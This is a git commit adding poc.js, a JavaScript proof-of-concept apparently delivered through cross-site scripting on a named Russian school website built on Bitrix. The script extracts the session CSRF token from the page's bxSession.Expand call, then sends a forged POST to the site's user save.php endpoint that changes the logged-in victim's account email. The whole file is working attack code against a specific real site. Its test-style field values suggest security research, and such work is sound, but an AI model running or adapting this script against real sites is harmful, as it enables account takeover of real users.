fc059d2ed1d9ca9d3b36b41984506495fb21ed9a
maxiw <105644018+maxiw15@users.noreply.github.com>
2025-08-04 15:17:29 +0300

    Create poc.js

---
+++ poc.js
@@ -0,0 +1,50 @@
+function getCSRFToken() {
+  const scripts = document.getElementsByTagName('script');
+  for (let script of scripts) {
+    if (script.textContent.includes('bxSession.Expand')) {
+      const tokenMatch = script.textContent.match(/bxSession\.Expand\('([^']+)'/);
+      if (tokenMatch && tokenMatch[1]) {
+        return tokenMatch[1].split('.')[0]; // "d43b6876f68547bb84ab757a7311b4fc"
+      }
+    }
+  }
+  return null;
+}
+
+function changeEmail(newEmail) {
+  const csrfToken = getCSRFToken();
+  if (!csrfToken) {
+    alert('CSRF token not found!');
+    return;
+  }
+
+  const formData = new FormData();
+  formData.append('values[email]', newEmail);
+  
+  formData.append('values[name]', 'SecurityTest');
+  formData.append('values[lastName]', 'XSS_Proof');
+  formData.append('values[login]', 'test3');
+  formData.append('values[secondName]', '');
+
+  fetch('https://karerskaya-sosh.nobl.ru/local/templates/g3/components/openregion/user/.default/http/save.php', {
+    method: 'POST',
+    headers: {
+      'X-Bitrix-Csrf-Token': csrfToken,
+    },
+    body: formData
+  })
+  .then(response => response.json())
+  .then(data => {
+    if(data.success) {
+      alert(`Email успешно изменен на ${newEmail}`);
+    } else {
+      alert('Ошибка при изменении email: ' + (data.error || 'Неизвестная ошибка'));
+    }
+  })
+  .catch(error => {
+    console.error('Request failed:', error);
+    alert('Сетевая ошибка');
+  });
+}
+
+changeEmail('your_safe_email@example.com');
